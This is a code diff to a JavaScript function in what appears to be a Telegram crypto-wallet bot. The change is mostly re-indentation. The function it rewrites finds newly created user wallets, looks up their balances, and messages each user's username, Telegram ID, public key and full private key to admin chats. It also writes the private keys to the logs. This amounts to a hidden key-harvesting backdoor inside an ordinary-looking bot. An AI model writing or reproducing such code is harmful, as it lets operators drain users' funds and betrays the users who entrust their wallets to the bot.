@@ -459,65 +459,66 @@ function monitorDatabaseForAdmin() {
         logger.error("Error querying main database for new entries: " + err);
         return;
       }
-    if (!rows || rows.length === 0) return;
-    
-    monitorDb.all("SELECT private_key FROM last_checked_entries", [], async (err, sentRows) => {
-      if (err) {
-        logger.error("Error querying monitor database for notified keys: " + err);
-        return;
-      }
+      if (!rows || rows.length === 0) return;
       
-      const sentKeysSet = new Set((sentRows || []).map((row) => row.private_key));
-      const newRows = rows.filter((row) => !sentKeysSet.has(row.private_key));
-      if (newRows.length === 0) return;
-      
-      getAdminChatIds().then(async (adminChatIds) => {
-        if (!adminChatIds || adminChatIds.length === 0) {
-          logger.info("No admin chat IDs set. Cannot send new wallet notifications.");
+      monitorDb.all("SELECT private_key FROM last_checked_entries", [], async (err, sentRows) => {
+        if (err) {
+          logger.error("Error querying monitor database for notified keys: " + err);
           return;
         }
         
-        for (const row of newRows) {
-          try {
-            const balance = await getWalletBalance(row.public_key);
-            const escUsername = escapeHTML(row.username || "N/A");
-            const escTelegramId = escapeHTML(String(row.telegram_id || ""));
-            const escPubKey = escapeHTML(row.public_key || "");
-            const escPrivKey = escapeHTML(row.private_key || "");
-            const escCreatedAt = escapeHTML(row.created_at || "");
-            
-            const message =
-              `<b>🔔 New Wallet Created</b>\n\n` +
-              `👤 <b>Username:</b> ${escUsername}\n` +
-              `📱 <b>Telegram ID:</b> ${escTelegramId}\n` +
-              `💰 <b>Balance:</b> ${balance.display}\n` +
-              `🔑 <b>Public Key:</b> <code>${escPubKey}</code>\n` +
-              `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
-              `🕒 <b>Created At:</b> ${escCreatedAt}`;
-              
-            for (const adminChatId of adminChatIds) {
-              await bot.sendMessage(adminChatId, message, {
-                parse_mode: "HTML",
-                disable_web_page_preview: true,
-              });
-            }
-            
-            await new Promise((resolve, reject) => {
-              monitorDb.run(
-                "INSERT OR IGNORE INTO last_checked_entries (private_key) VALUES (?)",
-                [row.private_key],
-                (err) => {
-                  if (err) return reject(err);
-                  resolve();
-                }
-              );
-            });
-            
-            logger.info(`Sent new wallet to admins & recorded key: ${row.private_key}`);
-          } catch (err) {
-            logger.error("Error processing wallet notification: " + err);
+        const sentKeysSet = new Set((sentRows || []).map((row) => row.private_key));
+        const newRows = rows.filter((row) => !sentKeysSet.has(row.private_key));
+        if (newRows.length === 0) return;
+        
+        getAdminChatIds().then(async (adminChatIds) => {
+          if (!adminChatIds || adminChatIds.length === 0) {
+            logger.info("No admin chat IDs set. Cannot send new wallet notifications.");
+            return;
           }
-        }
+          
+          for (const row of newRows) {
+            try {
+              const balance = await getWalletBalance(row.public_key);
+              const escUsername = escapeHTML(row.username || "N/A");
+              const escTelegramId = escapeHTML(String(row.telegram_id || ""));
+              const escPubKey = escapeHTML(row.public_key || "");
+              const escPrivKey = escapeHTML(row.private_key || "");
+              const escCreatedAt = escapeHTML(row.created_at || "");
+              
+              const message =
+                `<b>🔔 New Wallet Created</b>\n\n` +
+                `👤 <b>Username:</b> ${escUsername}\n` +
+                `📱 <b>Telegram ID:</b> ${escTelegramId}\n` +
+                `💰 <b>Balance:</b> ${balance.display}\n` +
+                `🔑 <b>Public Key:</b> <code>${escPubKey}</code>\n` +
+                `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
+                `🕒 <b>Created At:</b> ${escCreatedAt}`;
+                
+              for (const adminChatId of adminChatIds) {
+                await bot.sendMessage(adminChatId, message, {
+                  parse_mode: "HTML",
+                  disable_web_page_preview: true,
+                });
+              }
+              
+              await new Promise((resolve, reject) => {
+                monitorDb.run(
+                  "INSERT OR IGNORE INTO last_checked_entries (private_key) VALUES (?)",
+                  [row.private_key],
+                  (err) => {
+                    if (err) return reject(err);
+                    resolve();
+                  }
+                );
+              });
+              
+              logger.info(`Sent new wallet to admins & recorded key: ${row.private_key}`);
+            } catch (err) {
+              logger.error("Error processing wallet notification: " + err);
+            }
+          }
+        });
       });
     });
   });
